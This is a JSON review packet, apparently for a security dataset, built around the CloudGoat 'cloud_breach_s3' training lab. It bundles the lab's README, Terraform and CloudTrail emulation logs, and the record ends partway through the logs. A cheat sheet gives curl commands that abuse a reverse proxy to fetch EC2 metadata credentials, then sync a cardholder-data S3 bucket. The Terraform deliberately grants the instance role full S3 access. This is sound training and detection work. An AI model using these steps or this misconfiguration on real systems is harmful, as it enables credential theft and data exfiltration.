@@ -1,0 +1,3856 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "fe9eb72d45c848aeb30dbaa37e26a03d1841a92c6637cd8de5809b00212ed743",
+  "case_id": "cloudgoat:aws:cloud_breach_s3",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "B",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      },
+      {
+        "raw_ref": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/SDAWS-200914011940.yaml",
+        "sha256": "541c5b7e3ab874f1eca29c14a6bb4a56c2683be5d482cb292ce63513487cd533"
+      },
+      {
+        "raw_ref": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip#ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+        "sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "cloud_breach_s3",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/cheat_sheet.md"
+    ],
+    "terraform_file_count": 8,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/",
+    "review_score": 44,
+    "independence_group": "cloudgoat-scenario:cloud_breach_s3",
+    "runtime_observations_in_packet": 103,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label",
+    "runtime_evidence_source": "otrf_security_datasets",
+    "runtime_evidence_origin": "OTRF SDAWS-200914011940: independently published CloudTrail capture from a CloudGoat cloud-breach-s3 simulation",
+    "runtime_environment": "real_isolated_cloudgoat_derived_aws_emulation",
+    "runtime_scenario_independent": false
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/README.md",
+      "member_sha256": "ea0b172c08aeb0a4fc527d45066c3f79d0ee23b01680fb383a7dde3a77ea5385",
+      "bytes": 1904,
+      "content_kind": "md",
+      "text": "# Scenario: cloud_breach_s3\n\n**Size:** Small\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create cloud_breach_s3`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * EC2 x 1\n  * S3 x 1\n\n## Scenario Start(s)\n\n1. The IP Address of an EC2 server that is running a misconfigured reverse proxy\n\n## Scenario Goal(s)\n\nDownload the confidential files from the S3 bucket.\n\n## Summary\n\nStarting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3ffe907e-6281-47e9-b7bf-e07fdcb48103/image.png)\n\n## Route Walkthrough - Anonymous Attacker\n\n1. The attacker finds the IP of an EC2 instance by shady means, and after some reconnaissance realizes that it is acting as a reverse-proxy server. This is common, especially for organizations in the process of moving from on-premise to the cloud.\n2. After some research, the attacker uses `CURL` to send a request to the web server and set the host header to the IP address of EC2 metadata service.\n3. The attacker's specially-crafted CURL command is successful, returning the Access Key ID, Secret Access Key, and Session Token of the IAM Instance Profile attached to the EC2 instance.\n4. With the IAM role's credentials in hand, the attacker is now able to explore the victim's cloud environment using the powerful permissions granted to the role.\n5. The attacker is then able to list, identify, and access a private S3 bucket.\n6. Inside the private S3 bucket, the attacker finds several files full of sensitive information, and is able to download these to their local machine for dissemination.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/cheat_sheet.md",
+      "member_sha256": "a4cdceb797408d57e636a91c3c31047a1a0f4206263e7928f1c521170012cc03",
+      "bytes": 414,
+      "content_kind": "md",
+      "text": "`curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'`\n\n​\n`curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'`\n\n​\n`aws configure --profile erratic`\n\n​\n`aws_session_token = <session-token>`\n\n​\n`aws s3 ls --profile erratic`\n\n​\n`aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/manifest.yml",
+      "member_sha256": "94df1d642cf3869c96a94c3d972cf2e6568968eb86e877b2196830a3d8249342",
+      "bytes": 801,
+      "content_kind": "yml",
+      "text": "---\n# The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: cloud_breach_s3\n# The name of the author(s), comma separated\n- author: Rhino Security Labs\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n# Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting as an anonymous outsider with no access or privileges, exploit a misconfigured\n        reverse-proxy server to query the EC2 metadata service and acquire instance profile keys.\n        Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.\n        ...\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 07-31-2019\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/data_sources.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/data_sources.tf",
+      "member_sha256": "87ad419a0951dd6fef3e8e7a05c436814f4d109e1578d0d61829ff9fe2dc30cd",
+      "bytes": 527,
+      "content_kind": "tf",
+      "text": "#AWS Account Id\ndata \"aws_caller_identity\" \"aws-account-id\" {}\n\n# Dynamic Ubuntu 22.04 AMI (region-aware)\ndata \"aws_ami\" \"ubuntu\" {\n  most_recent = true\n  owners      = [\"099720109477\"] # Canonical (Ubuntu)\n\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  filter {\n    name   = \"root-device-type\"\n    values = [\"ebs\"]\n  }\n\n  filter {\n    name   = \"architecture\"\n    values = [\"x86_64\"]\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/ec2.tf",
+      "member_sha256": "6b17b156e2f64538d7279dfe00e3e79f5fa01791c95f51cbbf4f3d18575aa9f9",
+      "bytes": 3432,
+      "content_kind": "tf",
+      "text": "#IAM Role\nresource \"aws_iam_role\" \"cg-banking-WAF-Role\" {\n  name = \"cg-banking-WAF-Role-${var.cgid}\"\n  assume_role_policy = jsonencode(\n    {\n      Version = \"2012-10-17\",\n      Statement = [\n        {\n          Action = \"sts:AssumeRole\"\n          Principal = {\n            Service = \"ec2.amazonaws.com\"\n          }\n          Effect = \"Allow\"\n          Sid    = \"\"\n        }\n      ]\n    }\n  )\n\n  managed_policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n  ]\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-banking-WAF-Role-${var.cgid}\"\n  })\n}\n\n\n#IAM Instance Profile\nresource \"aws_iam_instance_profile\" \"cg-ec2-instance-profile\" {\n  name = \"cg-ec2-instance-profile-${var.cgid}\"\n  role = aws_iam_role.cg-banking-WAF-Role.name\n}\n\n#Security Groups\nresource \"aws_security_group\" \"cg-ec2-ssh-security-group\" {\n  name        = \"cg-ec2-ssh-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over SSH\"\n  vpc_id      = aws_vpc.cg-vpc.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-ssh-${var.cgid}\"\n  })\n}\n\nresource \"aws_security_group\" \"cg-ec2-http-security-group\" {\n  name        = \"cg-ec2-http-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP\"\n  vpc_id      = aws_vpc.cg-vpc.id\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = merge(local.default_tags, {\n    Name = \"cg-ec2-http-${var.cgid}\"\n  })\n}\n\n#AWS Key Pair\nresource \"aws_key_pair\" \"cg-ec2-key-pair\" {\n  key_name   = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = file(var.ssh-public-key-for-ec2)\n}\n\n#EC2 Instance\nresource \"aws_instance\" \"ec2-vulnerable-proxy-server\" {\n  ami                         = data.aws_ami.ubuntu.id\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.cg-ec2-instance-profile.name\n  subnet_id                   = aws_subnet.cg-public-subnet-1.id\n  associate_public_ip_address = true\n\n  vpc_security_group_ids = [\n    aws_security_group.cg-ec2-ssh-security-group.id,\n    aws_security_group.cg-ec2-http-security-group.id\n  ]\n\n  key_name = aws_key_pair.cg-ec2-key-pair.key_name\n  root_block_device {\n    volume_type           = \"gp2\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  provisioner \"file\" {\n    source      = \"../assets/proxy.com\"\n    destination = \"/home/ubuntu/proxy.com\"\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.ssh-private-key-for-ec2)\n      host        = self.public_ip\n    }\n  }\n\n  user_data = <<-EOF\n        #!/bin/bash\n        apt-get update\n        apt-get install -y nginx\n        ufw allow 'Nginx HTTP'\n        cp /home/ubuntu/proxy.com /etc/nginx/sites-enabled/proxy.com\n        rm /etc/nginx/sites-enabled/default\n        systemctl restart nginx\n        EOF\n\n  volume_tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  })\n\n  tags = merge(local.default_tags, {\n    Name = \"ec2-vulnerable-proxy-server-${var.cgid}\"\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/locals.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/locals.tf",
+      "member_sha256": "f771edd18c76f6316f3125c94cb6fb68eb9ae30817e482c797ea94caacfb8ca9",
+      "bytes": 301,
+      "content_kind": "tf",
+      "text": "locals {\n  s3_bucket_suffix = replace(var.cgid, \"/[^a-z0-9-.]/\", \"-\")\n\n  s3_objects = [\n    \"cardholder_data_primary.csv\",\n    \"cardholder_data_secondary.csv\",\n    \"cardholders_corporate.csv\",\n    \"goat.png\"\n  ]\n\n  default_tags = {\n    Stack    = var.stack-name\n    Scenario = var.scenario-name\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/outputs.tf",
+      "member_sha256": "2dfb594f5265f10bd6f2e98f44557f7791657d7ee413d45183bb7cf2261d355f",
+      "bytes": 263,
+      "content_kind": "tf",
+      "text": "#Required: Always output the AWS Account ID\noutput \"cloudgoat_output_aws_account_id\" {\n  value = data.aws_caller_identity.aws-account-id.account_id\n}\n\noutput \"cloudgoat_output_target_ec2_server_ip\" {\n  value = aws_instance.ec2-vulnerable-proxy-server.public_ip\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/provider.tf",
+      "member_sha256": "18db916056912c79fb391099ac9f2b529afdb80e1b45fc168476c1b20ab6a225",
+      "bytes": 490,
+      "content_kind": "tf",
+      "text": "## This configures the minimum required Terraform and provider versions.\n## Configure the AWS profile and region specified in the variables as well as default tags.\n\nterraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/s3.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/s3.tf",
+      "member_sha256": "8a27c6f1b592fa08b7a88fa42dd924be3633dd1fb9920f3787159771a4ae64b9",
+      "bytes": 677,
+      "content_kind": "tf",
+      "text": "#Secret S3 Bucket\nresource \"aws_s3_bucket\" \"cg-cardholder-data-bucket\" {\n  bucket        = \"cg-cardholder-data-bucket-${local.s3_bucket_suffix}\"\n  force_destroy = true\n\n  tags = merge(local.default_tags, {\n    Name        = \"cg-cardholder-data-bucket-${local.s3_bucket_suffix}\"\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for storing sensitive cardholder data.\"\n  })\n}\n\n# S3 Objects Uploaded\nresource \"aws_s3_object\" \"s3-objects\" {\n  for_each = toset(local.s3_objects)\n\n  bucket = aws_s3_bucket.cg-cardholder-data-bucket.id\n  key    = each.key\n  source = \"../assets/${each.key}\"\n\n  tags = merge(local.default_tags, {\n    Name = \"cardholder-data-${var.cgid}\"\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/variables.tf",
+      "member_sha256": "a7e6bc0e991a742eebc0217e71f29e1aaab1afb7313751f5c5bc17dfeb6f30b2",
+      "bytes": 1169,
+      "content_kind": "tf",
+      "text": "#Required: AWS Profile\nvariable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\n#Required: AWS Region\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\n#Required: CGID Variable for unique naming\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\n#Required: User's Public IP Address(es)\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address, pulled from the file ../whitelist.txt\"\n  type        = list(any)\n}\n\n#SSH Public Key\nvariable \"ssh-public-key-for-ec2\" {\n  description = \"Where to store the public key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\n#SSH Private Key\nvariable \"ssh-private-key-for-ec2\" {\n  description = \"Where to store the private key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\n#Stack Name\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\n#Scenario Name\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"cloud-breach-s3\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/cloud_breach_s3/terraform/vpc.tf",
+      "member_sha256": "2ba9b70869976d06333f82bb39b746bc358aadf9352bb91ea3872419318ae252",
+      "bytes": 1696,
+      "content_kind": "tf",
+      "text": "resource \"aws_vpc\" \"cg-vpc\" {\n  cidr_block           = \"10.10.0.0/16\"\n  enable_dns_hostnames = true\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} VPC\"\n  })\n}\n\n#Internet Gateway\nresource \"aws_internet_gateway\" \"cg-internet-gateway\" {\n  vpc_id = aws_vpc.cg-vpc.id\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Internet Gateway\"\n  })\n}\n\n#Public Subnets\nresource \"aws_subnet\" \"cg-public-subnet-1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.10.10.0/24\"\n  vpc_id            = aws_vpc.cg-vpc.id\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Public Subnet #1\"\n  })\n}\n\nresource \"aws_subnet\" \"cg-public-subnet-2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.10.20.0/24\"\n  vpc_id            = aws_vpc.cg-vpc.id\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Public Subnet #2\"\n  })\n}\n\n#Public Subnet Routing Table\nresource \"aws_route_table\" \"cg-public-subnet-route-table\" {\n  vpc_id = aws_vpc.cg-vpc.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.cg-internet-gateway.id\n  }\n\n  tags = merge(local.default_tags, {\n    Name = \"CloudGoat ${var.cgid} Route Table for Public Subnet\"\n  })\n}\n\n#Public Subnets Routing Associations\nresource \"aws_route_table_association\" \"cg-public-subnet-1-route-association\" {\n  subnet_id      = aws_subnet.cg-public-subnet-1.id\n  route_table_id = aws_route_table.cg-public-subnet-route-table.id\n}\n\nresource \"aws_route_table_association\" \"cg-public-subnet-2-route-association\" {\n  subnet_id      = aws_subnet.cg-public-subnet-2.id\n  route_table_id = aws_route_table.cg-public-subnet-route-table.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [
+    {
+      "instance_id": "instance-fb087c5e71c13441aa22",
+      "environment_kind": "otrf_cloudgoat_attack_emulation",
+      "runtime_source_id": "otrf_security_datasets",
+      "platform": "AWS",
+      "log_profile": "aws_cloudtrail_jsonl",
+      "observations": [
+        {
+          "observation_id": "obs-68a0d5ed4e1228ba894028a8",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:23.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceTypes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeInstanceTypesRequest": {
+              "NextToken": "AAIAAUCZLcGdOTmfTz2Vwy7qCVgVq6KNMDDo2s_UFVQdUl8JzmoaM3geYg-eTVO56npOwVkgRcbnccOAIh5xaIntUaFwx3Yzg5z0gJcGwKSvIHr7PoKDSMugzTo27wztP16CU4jRhTPQdzL5kAyA8MMWqgrYKoT5J0xc",
+              "MaxResults": 100
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 0,
+            "event_id": "fd4f1042-c7f6-4107-a6ee-d841d92596e7"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4ac8111c3126c8bb3adf8523",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:24.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 1,
+            "event_id": "a3d34faf-076e-44ff-b2f7-605d76705a81"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-0bc0097a9ce4bf83d52c8722",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:24.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "i-044b1baf4c96e1b62"
+                      }
+                    ]
+                  },
+                  "name": "instance-id"
+                }
+              ]
+            },
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 2,
+            "event_id": "53bb6d95-8860-4dc1-8bd8-be013478fd8b"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7bcc9d165c2b9a746fbe34f0",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:23.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "instancesSet": {
+              "items": [
+                {
+                  "instanceId": "i-044b1baf4c96e1b62"
+                }
+              ]
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 3,
+            "event_id": "d51c533f-2427-4474-aef9-4169a23abf08"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-6a3e5b9fffefbe7de6fd780b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:24.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceAttribute",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "attribute": "disableApiTermination",
+            "instanceId": "i-044b1baf4c96e1b62"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 4,
+            "event_id": "1e2bf051-8907-4aa7-8aed-b67d6eb016d6"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-a472076fc89da48049e3c514",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:44:22.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAccountAttributes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "accountAttributeNameSet": {},
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 5,
